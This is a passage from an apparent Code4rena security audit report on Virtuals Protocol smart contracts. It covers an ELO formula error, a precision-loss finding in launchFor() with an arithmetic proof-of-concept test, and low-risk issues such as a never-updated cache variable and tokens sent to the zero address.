<pre data-index="123" data-language="" class="grvsc-container dark-default-dark"><code class="grvsc-code"><span class="grvsc-line"><span class="grvsc-source">ratingDiff = 200, _negative = true</span></span>
<span class="grvsc-line"><span class="grvsc-source">n = 800 - 200 = 600</span></span>
<span class="grvsc-line"><span class="grvsc-source">n/25 = 24 → 10 ^24</span></span>
<span class="grvsc-line"><span class="grvsc-source">Fourth square root → 10 ^(24/16)=10^1.5≈31.623</span></span>
<span class="grvsc-line"><span class="grvsc-source">The denominator becomes 100+31.623=131.623, which is much smaller than the correct value 4.1623. </span></span></code></pre>
<p><strong>Results:</strong> expected score was incorrectly inflated, causing a complete distortion in the ELO change calculation.</p>
<p><strong>3. Summary of the root causes of the error</strong></p>
<ul>
<li><strong>Wrong offset:</strong> The introduction of <code>800 ± ratingDiff</code> has no mathematical basis, resulting in double errors in the exponent sign and magnitude.</li>
<li><strong>Decomposition steps are incompatible with integer operations:</strong> the correct decomposition should be <code>10^ratingDiff/400 = (10^ratingDiff/25)^1/16</code>. But after <code>n</code> was incorrectly offset in the code, the actual calculation of <code>10^(800±ratingDiff)/(25×16)</code> is equivalent to <code>10^(800±ratingDiff)/400</code>, which is completely deviated from the original formula.</li>
<li><strong>Sign processing is reversed:</strong> when <code>RA&gt;RB</code>, the exponent should be positive, but the offset in the code makes it become <code>(800−ratingDiff)/400</code>, resulting in the reverse calculation of the denominator.</li>
</ul>
<p><strong>Virtuals marked as informative</strong></p>
<hr>
<h2 style="position:relative;" id="m-26-imprecise-calculations-in-launchfor-lead-to-less-liquidity-be-added-to-the-pair-via-the-router"><a class="anchor before" aria-label="m 26 imprecise calculations in launchfor lead to less liquidity be added to the pair via the router permalink" href="#m-26-imprecise-calculations-in-launchfor-lead-to-less-liquidity-be-added-to-the-pair-via-the-router"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a><a href="https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/F-278">[M-26] Imprecise calculations in <code>launchFor()</code> lead to less liquidity be added to the pair via the router</a></h2>
<p><em>Submitted by <a href="https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-817">Matin</a>, also found by <a href="https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-760">codexNature</a></em></p>
<p><a href="https://github.com/code-423n4/2025-04-virtuals-protocol/blob/main/contracts/fun/Bonding.sol#L215-L216">https://github.com/code-423n4/2025-04-virtuals-protocol/blob/main/contracts/fun/Bonding.sol#L215-L216</a></p>
<h3 style="position:relative;" id="finding-description-and-impact-9"><a class="anchor before" aria-label="finding description and impact 9 permalink" href="#finding-description-and-impact-9"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>Finding description and impact</h3>
<p>Solidity rounds down the result of an integer division, and because of that, it is always recommended to multiply before dividing to avoid that precision loss. The problem arises in the Bonding.sol’s <code>launchFor()</code> function where the <code>liquidity</code> is calculated:</p>
<pre data-index="124" data-language="solidity" class="grvsc-container dark-default-dark"><code class="grvsc-code"><span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk4">function</span><span class="mtk1"> </span><span class="mtk11">launchFor</span><span class="mtk1">(</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">string</span><span class="mtk1"> </span><span class="mtk12">memory</span><span class="mtk1"> </span><span class="mtk12">_name</span><span class="mtk1">,</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">string</span><span class="mtk1"> </span><span class="mtk12">memory</span><span class="mtk1"> </span><span class="mtk12">_ticker</span><span class="mtk1">,</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">uint8</span><span class="mtk1">[] </span><span class="mtk12">memory</span><span class="mtk1"> </span><span class="mtk12">cores</span><span class="mtk1">,</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">string</span><span class="mtk1"> </span><span class="mtk12">memory</span><span class="mtk1"> </span><span class="mtk12">desc</span><span class="mtk1">,</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">string</span><span class="mtk1"> </span><span class="mtk12">memory</span><span class="mtk1"> </span><span class="mtk12">img</span><span class="mtk1">,</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">string</span><span class="mtk1">[</span><span class="mtk7">4</span><span class="mtk1">] </span><span class="mtk12">memory</span><span class="mtk1"> </span><span class="mtk12">urls</span><span class="mtk1">,</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">uint256</span><span class="mtk1"> </span><span class="mtk12">purchaseAmount</span><span class="mtk1">,</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">address</span><span class="mtk1"> </span><span class="mtk12">creator</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    ) </span><span class="mtk11">public</span><span class="mtk1"> </span><span class="mtk11">nonReentrant</span><span class="mtk1"> </span><span class="mtk11">returns</span><span class="mtk1"> (</span><span class="mtk12">address</span><span class="mtk1">, </span><span class="mtk12">address</span><span class="mtk1">, </span><span class="mtk12">uint</span><span class="mtk1">) {</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk3">// code</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">uint256</span><span class="mtk1"> </span><span class="mtk12">k</span><span class="mtk1"> = ((</span><span class="mtk12">K</span><span class="mtk1"> * </span><span class="mtk7">10000</span><span class="mtk1">) / </span><span class="mtk12">assetRate</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">uint256</span><span class="mtk1"> </span><span class="mtk12">liquidity</span><span class="mtk1"> = (((</span><span class="mtk12">k</span><span class="mtk1"> * </span><span class="mtk7">10000</span><span class="mtk1"> </span><span class="mtk12">ether</span><span class="mtk1">) / </span><span class="mtk12">supply</span><span class="mtk1">) * </span><span class="mtk7">1</span><span class="mtk1"> </span><span class="mtk12">ether</span><span class="mtk1">) / </span><span class="mtk7">10000</span><span class="mtk1">;</span></span></span></code></pre>
<p>Although this model is implemented to calculate the <code>k</code>, we can see there is a hidden division before a multiplication that makes round down the whole expression. This is bad as the precision loss can be significant, which leads to the pool calculating less <code>liquidity</code> than actual.</p>
<h3 style="position:relative;" id="recommended-mitigation-steps-30"><a class="anchor before" aria-label="recommended mitigation steps 30 permalink" href="#recommended-mitigation-steps-30"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>Recommended mitigation steps</h3>
<p>Consider changing the <code>liquidity</code> calculation in the way that prioritize the multiplication over division or use the high precision fixed point math libraries (e.g. PRB math lib).</p>
<h3 style="position:relative;" id="proof-of-concept-19"><a class="anchor before" aria-label="proof of concept 19 permalink" href="#proof-of-concept-19"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>Proof of Concept</h3>
<pre data-index="125" data-language="solidity" class="grvsc-container dark-default-dark"><code class="grvsc-code"><span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk12">uint256</span><span class="mtk1"> </span><span class="mtk12">public</span><span class="mtk1"> </span><span class="mtk12">constant</span><span class="mtk1"> </span><span class="mtk12">K</span><span class="mtk1"> = </span><span class="mtk7">3_000_000_000_000</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk4">function</span><span class="mtk1"> </span><span class="mtk11">testPrecisionLoss</span><span class="mtk1">(</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">uint256</span><span class="mtk1"> </span><span class="mtk12">assetRate</span><span class="mtk1">,</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">uint</span><span class="mtk1"> </span><span class="mtk12">supply</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    ) </span><span class="mtk11">public</span><span class="mtk1"> </span><span class="mtk11">pure</span><span class="mtk1"> </span><span class="mtk11">returns</span><span class="mtk1"> (</span><span class="mtk12">uint256</span><span class="mtk1"> </span><span class="mtk12">act</span><span class="mtk1">, </span><span class="mtk12">uint256</span><span class="mtk1"> </span><span class="mtk12">acc</span><span class="mtk1">) {</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">uint256</span><span class="mtk1"> </span><span class="mtk12">k</span><span class="mtk1"> = ((</span><span class="mtk12">K</span><span class="mtk1"> * </span><span class="mtk7">10000</span><span class="mtk1">) / </span><span class="mtk12">assetRate</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">act</span><span class="mtk1"> = (((</span><span class="mtk12">k</span><span class="mtk1"> * </span><span class="mtk7">10000</span><span class="mtk1"> </span><span class="mtk12">ether</span><span class="mtk1">) / </span><span class="mtk12">supply</span><span class="mtk1">) * </span><span class="mtk7">1</span><span class="mtk1"> </span><span class="mtk12">ether</span><span class="mtk1">) / </span><span class="mtk7">10000</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">acc</span><span class="mtk1"> = (</span><span class="mtk12">K</span><span class="mtk1"> * </span><span class="mtk7">10000</span><span class="mtk1"> * </span><span class="mtk7">10000</span><span class="mtk1"> </span><span class="mtk12">ether</span><span class="mtk1"> * </span><span class="mtk7">1</span><span class="mtk1"> </span><span class="mtk12">ether</span><span class="mtk1">) / (</span><span class="mtk12">assetRate</span><span class="mtk1"> * </span><span class="mtk12">supply</span><span class="mtk1"> * </span><span class="mtk7">10000</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    }</span></span></span></code></pre>
<p>For the <code>assetRate</code> and <code>supply</code> equal to (<code>7.98e15</code>, <code>1.9283e18</code>):</p>
<p>The result would be:</p>
<pre data-index="126" data-language="" class="grvsc-container dark-default-dark"><code class="grvsc-code"><span class="grvsc-line"><span class="grvsc-source">     Current Implementation  1555700000000000000</span></span>
<span class="grvsc-line"><span class="grvsc-source">     Actual Implementation   1949592125831354822</span></span></code></pre>
<p>This is equal to <code>~25%</code> relative error. Also, it is worth to mention that in some cases even the liquidity becomes zero. For the <code>assetRate</code> and <code>supply</code> equal to (<code>1e18</code>, <code>2e18</code>), the result would be:</p>
<pre data-index="127" data-language="" class="grvsc-container dark-default-dark"><code class="grvsc-code"><span class="grvsc-line"><span class="grvsc-source">     Current Implementation  0</span></span>
<span class="grvsc-line"><span class="grvsc-source">     Actual Implementation   15000000000000000</span></span></code></pre>
<hr>
<h1 style="position:relative;" id="low-risk-and-non-critical-issues"><a class="anchor before" aria-label="low risk and non critical issues permalink" href="#low-risk-and-non-critical-issues"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>Low Risk and Non-Critical Issues</h1>
<p>For this audit, 38 reports were submitted by wardens detailing low risk and non-critical issues. The <a href="https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-853">report highlighted below</a> by <strong>Sparrow</strong> received the top score from the judge.</p>
<p><em>The following wardens also submitted reports: <a href="https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-759">0xdonchev</a>, <a href="https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-811">0xhp9</a>, <a href="https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-402">alessio</a>, <a href="https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-840">Anyasaa</a>, <a href="https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-629">BlackAdam</a>, <a href="https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-266">cerweb10</a>, <a href="https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-805">chupinexx</a>, <a href="https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-219">codexNature</a>, <a href="https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-751">DanielTan</a>, <a href="https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-675">DanielTan_MetaTrust</a>, <a href="https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-71">FavourOkerri</a>, <a href="https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-405">francoHacker</a>, <a href="https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-788">geraldwenzel</a>, <a href="https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-850">gkrastenov</a>, <a href="https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-837">jeffy</a>, <a href="https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-170">joicygiore</a>, <a href="https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-792">K42</a>, <a href="https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-746">LeoGold</a>, <a href="https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-615">LhoussainePh</a>, <a href="https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-410">natachi</a>, <a href="https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-600">newspacexyz</a>, <a href="https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-851">Nexarion</a>, <a href="https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-699">Pelz</a>, <a href="https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-684">PolarizedLight</a>, <a href="https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-436">rayss</a>, <a href="https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-21">Rice_T</a>, <a href="https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-616">Roger</a>, <a href="https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-227">safie</a>, <a href="https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-65">Shinobi</a>, <a href="https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-789">Silverwind</a>, <a href="https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-571">slowbugmayor</a>, <a href="https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-25">sungjun0208</a>, <a href="https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-213">tacitvs</a>, <a href="https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-319">TheCarrot</a>, <a href="https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-761">unique</a>, <a href="https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-59">zhanmingjing</a>, and <a href="https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-599">zubyoz</a>.</em></p>
<p><em>Note: QA report issues deemed invalid by the judge have been omitted from this report.</em></p>
<h2 style="position:relative;" id="01-missing-update-of-prevagentid-in-promptmulti"><a class="anchor before" aria-label="01 missing update of prevagentid in promptmulti permalink" href="#01-missing-update-of-prevagentid-in-promptmulti"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>[01] Missing update of <code>prevAgentId</code> in <code>promptMulti</code></h2>
<p>The <code>promptMulti</code> function in <code>AgentInference.sol</code> is intended to optimize repeated calls to <code>agentNft.virtualInfo(agentId).tba</code> by caching the previous <code>agentId</code> and its corresponding TBA address. However, the variable <code>prevAgentId</code> is never updated within the loop. As a result, the optimization is non-functional: for each iteration, the contract will call <code>agentNft.virtualInfo(agentId).tba</code> whenever the current <code>agentId</code> is not zero, regardless of whether the agent ID has changed from the previous iteration. This leads to unnecessary repeated external calls, increasing gas costs and reducing efficiency.</p>
<p><a href="https://github.com/code-423n4/2025-04-virtuals-protocol/blob/ba460bcbc56555f0c4f270c04e9c2375274059d1/contracts/AgentInference.sol#L80-L91">AgentInference.sol#L80-L91</a></p>
<pre data-index="128" data-language="solidity" class="grvsc-container dark-default-dark"><code class="grvsc-code"><span class="grvsc-line"><span class="grvsc-source"><span class="mtk12">uint256</span><span class="mtk1"> </span><span class="mtk12">prevAgentId</span><span class="mtk1"> = </span><span class="mtk7">0</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk12">address</span><span class="mtk1"> </span><span class="mtk12">agentTba</span><span class="mtk1"> = </span><span class="mtk11">address</span><span class="mtk1">(</span><span class="mtk7">0</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk15">for</span><span class="mtk1"> (</span><span class="mtk12">uint256</span><span class="mtk1"> </span><span class="mtk12">i</span><span class="mtk1"> = </span><span class="mtk7">0</span><span class="mtk1">; </span><span class="mtk12">i</span><span class="mtk1"> &lt; </span><span class="mtk12">len</span><span class="mtk1">; </span><span class="mtk12">i</span><span class="mtk1">++) {</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk12">uint256</span><span class="mtk1"> </span><span class="mtk12">agentId</span><span class="mtk1"> = </span><span class="mtk12">agentIds</span><span class="mtk1">[</span><span class="mtk12">i</span><span class="mtk1">];</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk15">if</span><span class="mtk1"> (</span><span class="mtk12">prevAgentId</span><span class="mtk1"> != </span><span class="mtk12">agentId</span><span class="mtk1">) {</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">agentTba</span><span class="mtk1"> = </span><span class="mtk12">agentNft</span><span class="mtk1">.</span><span class="mtk11">virtualInfo</span><span class="mtk1">(</span><span class="mtk12">agentId</span><span class="mtk1">).</span><span class="mtk12">tba</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    }</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk12">token</span><span class="mtk1">.</span><span class="mtk11">safeTransferFrom</span><span class="mtk1">(</span><span class="mtk12">sender</span><span class="mtk1">, </span><span class="mtk12">agentTba</span><span class="mtk1">, </span><span class="mtk12">amounts</span><span class="mtk1">[</span><span class="mtk12">i</span><span class="mtk1">]);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk12">inferenceCount</span><span class="mtk1">[</span><span class="mtk12">agentId</span><span class="mtk1">]++;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk12">emit</span><span class="mtk1"> </span><span class="mtk11">Prompt</span><span class="mtk1">(</span><span class="mtk12">sender</span><span class="mtk1">, </span><span class="mtk12">promptHashes</span><span class="mtk1">[</span><span class="mtk12">i</span><span class="mtk1">], </span><span class="mtk12">agentId</span><span class="mtk1">, </span><span class="mtk12">amounts</span><span class="mtk1">[</span><span class="mtk12">i</span><span class="mtk1">], </span><span class="mtk12">coreIds</span><span class="mtk1">[</span><span class="mtk12">i</span><span class="mtk1">]);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">}</span></span></span></code></pre>
<h3 style="position:relative;" id="recommended-mitigation-steps-31"><a class="anchor before" aria-label="recommended mitigation steps 31 permalink" href="#recommended-mitigation-steps-31"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>Recommended mitigation steps</h3>
<p>Update <code>prevAgentId</code> to the current <code>agentId</code> after fetching a new TBA address within the loop. This ensures that the optimization works as intended and redundant calls are avoided.</p>
<h2 style="position:relative;" id="02-duplicate-import-statement-for-mathsol"><a class="anchor before" aria-label="02 duplicate import statement for mathsol permalink" href="#02-duplicate-import-statement-for-mathsol"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>[02] Duplicate import statement for <code>Math.sol</code></h2>
<p>In <code>AgentInference.sol</code>, the <code>@openzeppelin/contracts/utils/math/Math.sol</code> library is imported twice at the top of the file. This duplication is unnecessary and could lead to confusion for maintainers or reviewers. While it does not directly impact contract functionality or security, it is a code quality issue that can be easily avoided.</p>
<p><a href="https://github.com/code-423n4/2025-04-virtuals-protocol/blob/ba460bcbc56555f0c4f270c04e9c2375274059d1/contracts/AgentInference.sol#L6-L10">AgentInference.sol#L6-L10</a></p>
<pre data-index="129" data-language="solidity" class="grvsc-container dark-default-dark"><code class="grvsc-code"><span class="grvsc-line"><span class="grvsc-source"><span class="mtk15">import</span><span class="mtk1"> </span><span class="mtk8">"@openzeppelin/contracts/utils/math/Math.sol"</span><span class="mtk1">; </span><span class="mtk3">// Line 5</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk3">// ... other imports</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk15">import</span><span class="mtk1"> </span><span class="mtk8">"@openzeppelin/contracts/utils/math/Math.sol"</span><span class="mtk1">; </span><span class="mtk3">// Line 8 - duplicated import</span></span></span></code></pre>
<h3 style="position:relative;" id="recommended-mitigation-steps-32"><a class="anchor before" aria-label="recommended mitigation steps 32 permalink" href="#recommended-mitigation-steps-32"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>Recommended mitigation steps</h3>
<p>Remove the redundant import statement so that <code>Math.sol</code> is imported only once at the top of the contract file.</p>
<h2 style="position:relative;" id="03-invalid-agentid-leads-to-token-burning"><a class="anchor before" aria-label="03 invalid agentid leads to token burning permalink" href="#03-invalid-agentid-leads-to-token-burning"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>[03] Invalid <code>agentId</code> leads to token burning</h2>
<p>The <code>prompt</code> and <code>promptMulti</code> functions in <code>AgentInference.sol</code> do not validate if an <code>agentId</code> exists in the <code>agentNft</code> contract before transferring tokens. If an invalid <code>agentId</code> is provided, <code>agentNft.virtualInfo(agentId).tba</code> will return <code>address(0)</code> (the zero address), causing tokens to be sent to this address. Sending tokens to the zero address effectively burns them, resulting in permanent loss of funds.</p>
<p>This issue can occur through user error (e.g., providing an incorrect agent ID) or potentially through malicious inputs in a front-end interface. The impact is severe as users have no way to recover tokens sent to the zero address.</p>
<p><a href="https://github.com/code-423n4/2025-04-virtuals-protocol/blob/ba460bcbc56555f0c4f270c04e9c2375274059d1/contracts/AgentInference.sol#L52-L55">AgentInference.sol#L52-L55</a></p>
<pre data-index="130" data-language="solidity" class="grvsc-container dark-default-dark"><code class="grvsc-code"><span class="grvsc-line"><span class="grvsc-source"><span class="mtk3">// In prompt() function</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk12">uint256</span><span class="mtk1"> </span><span class="mtk12">agentId</span><span class="mtk1"> = </span><span class="mtk12">agentIds</span><span class="mtk1">[</span><span class="mtk12">i</span><span class="mtk1">];</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk12">address</span><span class="mtk1"> </span><span class="mtk12">agentTba</span><span class="mtk1"> = </span><span class="mtk12">agentNft</span><span class="mtk1">.</span><span class="mtk11">virtualInfo</span><span class="mtk1">(</span><span class="mtk12">agentId</span><span class="mtk1">).</span><span class="mtk12">tba</span><span class="mtk1">;</span></span></span>
